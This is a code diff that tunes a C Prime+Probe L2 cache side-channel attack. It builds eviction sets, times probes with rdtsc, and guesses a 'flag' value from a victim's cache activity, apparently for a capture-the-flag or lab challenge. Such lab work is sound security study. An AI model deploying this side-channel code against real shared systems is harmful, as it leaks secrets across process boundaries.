@@ -4,11 +4,10 @@
 #include <sys/mman.h>
 #include <unistd.h>
 
-#define NUM_VALUES 256
 #define NUM_L2_CACHE_SETS 1024
 #define WAYS 16
-#define REPEATS 100
-#define THRESHOLD 130
+#define REPEATS 300
+#define THRESHOLD 300
 
 // Read timestamp counter
 static inline uint64_t rdtsc() {
@@ -17,15 +16,12 @@ static inline uint64_t rdtsc() {
     return ((uint64_t)hi << 32) | lo;
 }
 
-// Allocate 2MB hugepage
+// Allocate a 2MB huge page
 char* get_buffer() {
-
     size_t size = 2 * 1024 * 1024;
 
-    char *buf = mmap(NULL, size,
-                     PROT_READ | PROT_WRITE,
-                     MAP_ANONYMOUS | MAP_PRIVATE |
-                     MAP_HUGETLB | MAP_POPULATE,
+    char *buf = mmap(NULL, size, PROT_READ | PROT_WRITE,
+                     MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE,
                      -1, 0);
 
     if (buf == (void*)-1) {
@@ -37,7 +33,7 @@ char* get_buffer() {
     return buf;
 }
 
-// Build eviction set
+// Build eviction set for one cache set
 void get_partial_eviction_set(char *buf, char *eviction_set[WAYS], int set_index) {
 
     for (int i = 0; i < WAYS; i++) {
@@ -48,7 +44,6 @@ void get_partial_eviction_set(char *buf, char *eviction_set[WAYS], int set_index
 int main() {
 
     char *buf = get_buffer();
-
     char *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
 
     for (int i = 0; i < NUM_L2_CACHE_SETS; i++)
@@ -60,13 +55,11 @@ int main() {
 
     while (1) {
 
-        uint64_t scores[NUM_VALUES] = {0};
+        uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
         for (int r = 0; r < REPEATS; r++) {
 
-            for (int val = 0; val < NUM_VALUES; val++) {
-
-                int set = val * 4;
+            for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
 
                 // PRIME
                 for (int j = 0; j < WAYS; j++)
@@ -74,34 +67,37 @@ int main() {
 
                 asm volatile("mfence; lfence");
 
-                // PROBE
+                // WAIT so victim can run
+                for (volatile int d = 0; d < 10000; d++);
+
+                // PROBE (reverse order prevents self-eviction)
                 uint64_t start = rdtsc();
 
-                for (int j = 0; j < WAYS; j++)
+                for (int j = WAYS - 1; j >= 0; j--)
                     tmp = *(eviction_sets[set][j]);
 
                 uint64_t end = rdtsc();
 
-                scores[val] += (end - start);
+                scores[set] += (end - start);
             }
         }
 
-        int best_val = -1;
-        uint64_t best_score = 0;
+        int guessed_flag = -1;
+        uint64_t max_score = 0;
 
-        for (int v = 0; v < NUM_VALUES; v++) {
+        for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
 
-            if (scores[v] > best_score) {
-                best_score = scores[v];
-                best_val = v;
+            if (scores[i] > max_score) {
+                max_score = scores[i];
+                guessed_flag = i;
             }
         }
 
-        uint64_t avg = best_score / REPEATS;
+        uint64_t avg = max_score / REPEATS;
 
         if (avg > THRESHOLD) {
-            printf("Detected flag value: %d (latency=%lu)\n",
-                   best_val, avg);
+            printf("Guessed flag: %d (latency=%lu)\n",
+                   guessed_flag, avg);
             fflush(stdout);
         }
 
